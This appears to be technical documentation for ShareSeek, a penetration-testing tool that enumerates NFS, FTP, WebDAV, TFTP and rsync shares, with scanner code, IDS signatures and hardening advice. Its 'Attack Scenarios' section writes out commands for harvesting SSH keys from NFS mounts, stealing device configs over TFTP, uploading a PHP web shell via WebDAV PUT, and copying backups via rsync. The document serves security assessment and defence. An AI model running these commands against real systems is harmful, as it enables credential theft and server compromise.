# ShareSeek Technical Summary

## Overview
ShareSeek is a multi-protocol network share discovery tool designed for penetration testing and security assessments. It identifies and enumerates file sharing services including NFS (Network File System), FTP (File Transfer Protocol), WebDAV (Web Distributed Authoring and Versioning), TFTP (Trivial File Transfer Protocol), and rsync servers across internal networks.

Network shares are frequently misconfigured with weak access controls, providing attackers with unauthorized access to sensitive data, credentials, and system configurations.

## Architecture

### Core Components
1. **Port Scanner**: TCP/UDP connection testing
2. **Protocol Handlers**: Service-specific enumeration
3. **NFS Enumerator**: Export listing via showmount
4. **FTP Tester**: Anonymous access validation
5. **WebDAV Detector**: HTTP OPTIONS method testing
6. **rsync Enumerator**: Module discovery
7. **TFTP Prober**: UDP-based service detection
8. **Report Generator**: Multi-format output (TXT, JSON)

### Scanning Flow
```
IP List → Port Scan → Service Detection → Protocol Enumeration → Access Testing → Reporting
         (21,69,873   (FTP/NFS/WebDAV    (showmount/OPTIONS  (anonymous/world  (sharelist.txt
          2049,80)     /rsync/TFTP)       /rsync list)        readable)         +details)
```

## Implementation Details

### Port Detection
```python
def check_port(ip: str, port: int, timeout: int = 2) -> bool:
    """
    TCP connection test for share services
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False
```

**Ports Tested**:
- 21 (TCP): FTP
- 69 (UDP): TFTP
- 80, 443, 8080 (TCP): HTTP/HTTPS (WebDAV)
- 873 (TCP): rsync
- 2049 (TCP/UDP): NFS

### NFS Enumeration

**Export Discovery**:
```python
def check_nfs(ip: str, timeout: int = 10) -> Dict:
    """
    List NFS exports using showmount
    """
    result = {
        'enabled': False,
        'exports': [],
        'error': None
    }
    
    try:
        proc = subprocess.run(
            ['showmount', '-e', ip],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = proc.stdout
        
        if proc.returncode == 0 and output:
            result['enabled'] = True
            
            # Parse export list (skip header line)
            for line in output.split('\n')[1:]:
                line = line.strip()
                if line:
                    parts = line.split()
                    if parts:
                        export_path = parts[0]
                        clients = ' '.join(parts[1:]) if len(parts) > 1 else '*'
                        result['exports'].append({
                            'path': export_path,
                            'clients': clients
                        })
        
        return result
        
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'showmount not found'
    except Exception as e:
        result['error'] = str(e)
    
    return result
```

**showmount Protocol**:
1. Connect to port 2049 (NFS) or 111 (portmapper)
2. Query RPC program number 100005 (mountd)
3. Call MOUNTPROC_EXPORT procedure
4. Receive export list with paths and access controls

**Export Format**:
```
/data            *                    # World-accessible
/backup          192.168.0.0/16       # Network-restricted
/home            client1.domain.com   # Host-specific
```

**Access Control Interpretation**:
- `*`: Any client can mount
- `192.168.0.0/16`: CIDR-based restriction
- `hostname`: Specific host only
- `(everyone)`: Explicitly world-readable

### FTP Anonymous Access Testing

```python
def check_ftp(ip: str, timeout: int = 10) -> Dict:
    """
    Test FTP anonymous access
    """
    result = {
        'enabled': False,
        'banner': None,
        'anonymous': False,
        'error': None
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 21))
        
        # Get banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        result['banner'] = banner
        result['enabled'] = True
        
        # Test anonymous login
        sock.send(b'USER anonymous\r\n')
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # 331 = Need password, 230 = Already logged in
        if '331' in response or '230' in response:
            sock.send(b'PASS anonymous@\r\n')
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if '230' in response:  # Login successful
                result['anonymous'] = True
        
        sock.close()
        
    except Exception as e:
        result['error'] = str(e)
    
    return result
```

**FTP Response Codes**:
- 220: Service ready
- 331: Username okay, need password
- 230: User logged in
- 530: Not logged in (anonymous rejected)

**Common FTP Banners**:
- `220 ProFTPD`: Linux ProFTPD server
- `220 Microsoft FTP Service`: Windows IIS
- `220 (vsFTPd X.X.X)`: Very Secure FTP Daemon
- `220-FileZilla Server`: FileZilla

### WebDAV Detection

```python
def check_webdav(ip: str, port: int = 80, timeout: int = 10) -> Dict:
    """
    Detect WebDAV via HTTP OPTIONS method
    """
    result = {
        'enabled': False,
        'methods': [],
        'paths': [],
        'error': None
    }
    
    import http.client
    import ssl
    
    # Test common WebDAV paths
    for path in ['/webdav', '/dav', '/remote.php/webdav', '/']:
        try:
            # HTTPS or HTTP
            if port in [443, 8443]:
                context = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=timeout, 
                                                   context=context)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            
            # Send OPTIONS request
            conn.request('OPTIONS', path)
            response = conn.getresponse()
            
            # Check for WebDAV indicators
            allow_header = response.getheader('Allow')
            dav_header = response.getheader('DAV')
            
            # WebDAV-specific methods
            webdav_methods = ['PROPFIND', 'PROPPATCH', 'MKCOL', 
                            'COPY', 'MOVE', 'LOCK', 'UNLOCK']
            
            if allow_header:
                if any(method in allow_header.upper() for method in webdav_methods):
                    result['enabled'] = True
                    result['methods'] = allow_header.split(',')
                    result['paths'].append(path)
            
            if dav_header:
                result['enabled'] = True
                if path not in result['paths']:
                    result['paths'].append(path)
            
            conn.close()
            
            if result['enabled']:
                break
                
        except Exception:
            continue
    
    return result
```

**WebDAV Methods**:
- **PROPFIND**: Retrieve properties
- **PROPPATCH**: Modify properties
- **MKCOL**: Create collection (directory)
- **COPY**: Copy resource
- **MOVE**: Move resource
- **LOCK**: Lock resource
- **UNLOCK**: Unlock resource
- **PUT**: Upload file (HTTP method, but critical for WebDAV)
- **DELETE**: Delete resource

**DAV Header**:
```
DAV: 1, 2, 3
```
Indicates WebDAV compliance level (1 = basic, 2 = locks, 3 = access control)

### rsync Enumeration

```python
def check_rsync(ip: str, timeout: int = 10) -> Dict:
    """
    List rsync modules
    """
    result = {
        'enabled': False,
        'modules': [],
        'error': None
    }
    
    try:
        proc = subprocess.run(
            ['rsync', f'rsync://{ip}/'],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = proc.stdout
        
        # Check for valid module list
        if output and 'MOTD' not in output and '@ERROR' not in output:
            result['enabled'] = True
            
            # Parse module listing
            for line in output.split('\n'):
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split()
                    if parts:
                        module_name = parts[0]
                        comment = ' '.join(parts[1:]) if len(parts) > 1 else ''
                        result['modules'].append({
                            'name': module_name,
                            'comment': comment
                        })
        
        return result
        
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'rsync not found'
    except Exception as e:
        result['error'] = str(e)
    
    return result
```

**rsync Protocol**:
1. Connect to port 873 (rsync daemon)
2. Send protocol version negotiation
3. Request module list
4. Receive module names and descriptions

**Module Format**:
```
files           File repository
backups         Backup storage
logs            System logs
```

### TFTP Detection

```python
def check_tftp(ip: str, timeout: int = 5) -> Dict:
    """
    Detect TFTP server via UDP probe
    """
    result = {
        'enabled': False,
        'error': None
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        
        # TFTP Read Request (RRQ) packet
        # Format: [opcode:2][filename:string][0][mode:string][0]
        request = b'\x00\x01' + b'test.txt' + b'\x00' + b'octet' + b'\x00'
        
        sock.sendto(request, (ip, 69))
        
        # Wait for response (any response = TFTP running)
        response, addr = sock.recvfrom(1024)
        
        if response:
            result['enabled'] = True
        
        sock.close()
        
    except socket.timeout:
        result['error'] = 'Timeout (may not be running)'
    except Exception as e:
        result['error'] = str(e)
    
    return result
```

**TFTP Packet Format**:
```
RRQ/WRQ:  [01/02][filename][0][mode][0]
DATA:     [03][block#][data]
ACK:      [04][block#]
ERROR:    [05][error_code][error_msg][0]
```

**TFTP Opcodes**:
- 01: Read Request (RRQ)
- 02: Write Request (WRQ)
- 03: Data packet
- 04: Acknowledgment
- 05: Error

**No Authentication**: TFTP has no built-in authentication mechanism

## Concurrent Execution

### Threading Model
```python
with ThreadPoolExecutor(max_workers=10) as executor:
    future_to_ip = {
        executor.submit(scan_host, ip, timeout, test_access): ip 
        for ip in ips
    }
    
    for future in as_completed(future_to_ip):
        ip = future_to_ip[future]
        result = future.result()
        results.append(result)
```

**Performance Characteristics**:
- Default: 10 concurrent workers
- Each worker: Independent thread
- I/O bound: Network and subprocess calls
- Per-host timing:
  - Port checks (5 ports): ~1-3 seconds
  - NFS showmount: ~5-10 seconds
  - FTP test: ~3-5 seconds
  - WebDAV check: ~2-5 seconds per path
  - rsync list: ~3-5 seconds
  - TFTP probe: ~2-5 seconds
  - Total: ~15-30 seconds per host (if all services present)

**Network Scan Times**:
- /24 (254 hosts), 10 workers: ~10-20 minutes
- /24, 20 workers: ~5-10 minutes
- /16 (65,536 hosts), 10 workers: ~40-80 hours
- /16, 50 workers: ~10-20 hours

## Output Formats

### sharelist.txt (Simple)
```
ftp://192.168.1.50
192.168.1.51:/data
192.168.1.51:/backup
rsync://192.168.1.52/files
http://192.168.1.53:80/webdav
tftp://192.168.1.54
```

**Purpose**: Direct mounting or access, input for other tools

### share_details.txt (Human-Readable)
```
ShareSeek - Network Share Discovery Results
======================================================================
Scan Date: 2025-10-14 12:00:00
Total Hosts with Shares: 5
======================================================================

Host: 192.168.1.50
Hostname: fileserver01.company.local
⚠ ANONYMOUS ACCESS ALLOWED
Services Found: FTP
----------------------------------------------------------------------

  Service: FTP
  Banner: 220 ProFTPD 1.3.5 Server
  Anonymous Access: YES

Accessible Shares (1):
  ✓ ftp://192.168.1.50

======================================================================
```

### share_details.json (Machine-Readable)
```json
[
  {
    "ip": "192.168.1.50",
    "hostname": "fileserver01.company.local",
    "shares_found": true,
    "services": {
      "FTP": {
        "enabled": true,
        "banner": "220 ProFTPD 1.3.5 Server",
        "anonymous": true,
        "error": null
      }
    },
    "accessible_shares": [
      {
        "type": "FTP",
        "path": "ftp://192.168.1.50",
        "anonymous": true
      }
    ],
    "anonymous_access": true,
    "error": null
  }
]
```

## Security Implications

### Common Misconfigurations

**NFS World-Readable Exports**:
```bash
# BAD: /etc/exports
/data    *(rw,no_root_squash)
```
- `*`: Any client can mount
- `rw`: Read-write access
- `no_root_squash`: Root on client = root on server
- **Impact**: Complete file system access

**Anonymous FTP**:
```bash
# BAD: vsftpd configuration
anonymous_enable=YES
write_enable=YES
anon_upload_enable=YES
```
- **Impact**: Anyone can upload/download files

**Open WebDAV with PUT**:
```apache
# BAD: Apache configuration
<Location /webdav>
    Dav On
    # No authentication!
</Location>
```
- **Impact**: Web shell upload, arbitrary file access

**Unrestricted TFTP**:
```bash
# BAD: TFTP configuration
# No access control at all
```
- **Impact**: Configuration file theft, firmware manipulation

**Open rsync Modules**:
```bash
# BAD: /etc/rsyncd.conf
[files]
    path = /data
    read only = no
    # No auth users, no hosts allow
```
- **Impact**: Data exfiltration, file modification

### Attack Scenarios

**Scenario 1: Credential Harvesting**
1. Discover NFS export: `/home (*)`
2. Mount: `mount -t nfs 192.168.1.51:/home /mnt`
3. Extract SSH keys: `find /mnt -name "id_rsa"`
4. Extract bash histories: `find /mnt -name ".bash_history"`
5. **Result**: User credentials and command history

**Scenario 2: Configuration Theft**
1. Discover TFTP on network device: `192.168.1.254:69`
2. Download config: `tftp 192.168.1.254 -c get startup-config`
3. Extract passwords: `grep -i "password\|secret" startup-config`
4. **Result**: Device admin passwords, SNMP communities

**Scenario 3: Web Shell Upload**
1. Discover WebDAV: `http://192.168.1.53/webdav`
2. Test PUT method: `curl -X PUT http://192.168.1.53/webdav/test.txt`
3. Upload shell: `curl -X PUT http://192.168.1.53/webdav/shell.php -d '<?php system($_GET["c"]); ?>'`
4. Execute: `curl http://192.168.1.53/webdav/shell.php?c=whoami`
5. **Result**: Web server compromise

**Scenario 4: Data Exfiltration**
1. Discover rsync: `rsync://192.168.1.52/backups`
2. List contents: `rsync rsync://192.168.1.52/backups/`
3. Download all: `rsync -av rsync://192.168.1.52/backups/ ./backups/`
4. **Result**: Complete backup repository copied

## Detection & Defense

### Network Detection

**IDS Signatures**:
```
# NFS showmount scan
alert tcp any any -> $HOME_NET 2049 (
    msg:"NFS Showmount Enumeration";
    flow:to_server,established;
    content:"|00 00 00 00 00 00 00 01|";
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000100;
)

# FTP anonymous login attempts
alert tcp any any -> $HOME_NET 21 (
    msg:"FTP Anonymous Login Attempt";
    flow:to_server,established;
    content:"USER anonymous";
    nocase;
    sid:3000101;
)

# WebDAV OPTIONS scan
alert tcp any any -> $HOME_NET any (
    msg:"WebDAV OPTIONS Enumeration";
    flow:to_server,established;
    content:"OPTIONS ";
    content:"DAV";
    threshold:type threshold, track by_src, count 5, seconds 60;
    sid:3000102;
)
```

### Defensive Measures

**NFS Hardening**:
```bash
# /etc/exports
/data 192.168.1.0/24(rw,root_squash,no_subtree_check)
/backup 192.168.1.100(ro,root_squash)

# Disable NFSv3, use NFSv4 only
# /etc/nfs.conf
[nfsd]
vers3=no
vers4=yes

# Firewall
iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
```

**FTP Hardening**:
```bash
# /etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES

# Or disable entirely
systemctl stop vsftpd && systemctl disable vsftpd
```

**WebDAV Hardening**:
```apache
<Location /webdav>
    AuthType Basic
    AuthName "WebDAV Access"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
    
    # Restrict dangerous methods
    <LimitExcept GET HEAD OPTIONS PROPFIND>
        Require user admin
    </LimitExcept>
</Location>
```

## Limitations

### Technical Limitations
- **UDP detection**: TFTP (UDP port 69) less reliable
- **Firewall filtering**: Can block enumeration
- **Authentication required**: Cannot test password-protected shares
- **Tool dependencies**: Requires showmount, rsync
- **False negatives**: Timeout or misconfiguration can hide shares

### Scope Limitations
- **No SMB/CIFS**: Use SMBSeek for Windows shares
- **No exploitation**: Detection only, no access validation beyond anonymous
- **No content analysis**: Doesn't examine share contents
- **No credential testing**: Doesn't attempt authentication

## Performance Optimization

### Speed vs Coverage

| Mode | Workers | Timeout | /24 Time | Protocols |
|------|---------|---------|----------|-----------|
| Fast | 50 | 1 | 3-5 min | All (shallow) |
| Standard | 10 | 2 | 10-15 min | All |
| Thorough | 5 | 10 | 20-30 min | All (deep) |

### Optimization Techniques
```bash
# Pre-filter with Nmap
nmap -p 21,69,873,2049,80,443 192.168.1.0/24 --open -oG - | \
    grep "/open/" | cut -d' ' -f2 > targets.txt
./shareseek.py -f targets.txt -w 50

# Parallel scanning (split networks)
./shareseek.py -f subnet1.txt &
./shareseek.py -f subnet2.txt &
./shareseek.py -f subnet3.txt &
```

## Dependencies

### Required
- Python 3.6+
- Standard library: `socket`, `subprocess`, `http.client`, `ssl`

### Optional (but recommended)
- `showmount` (from nfs-common/nfs-utils)
- `rsync`

### Installation
```bash
# Debian/Ubuntu
sudo apt install nfs-common rsync

# CentOS/RHEL
sudo yum install nfs-utils rsync

# macOS
brew install nfs-client rsync
```

## Future Enhancements
- SMB/CIFS share detection integration
- Credential-based access testing
- Automated share content enumeration
- Cloud storage protocol support (S3, Azure Blob)
- Share permission analysis
- Historical tracking and change detection
- Integration with vulnerability databases
- Automated exploitation modules

## References
- **NFS**: RFC 1813 (NFSv3), RFC 3530 (NFSv4)
- **FTP**: RFC 959
- **WebDAV**: RFC 4918
- **TFTP**: RFC 1350
- **rsync**: https://rsync.samba.org/
- **MITRE ATT&CK**: T1039 (Data from Network Shared Drive)
- **CWE-284**: Improper Access Control
- **CWE-306**: Missing Authentication for Critical Function

---

**Note**: This tool discovers legitimate network services that may be misconfigured. Always operate within authorized scope and follow responsible disclosure practices.
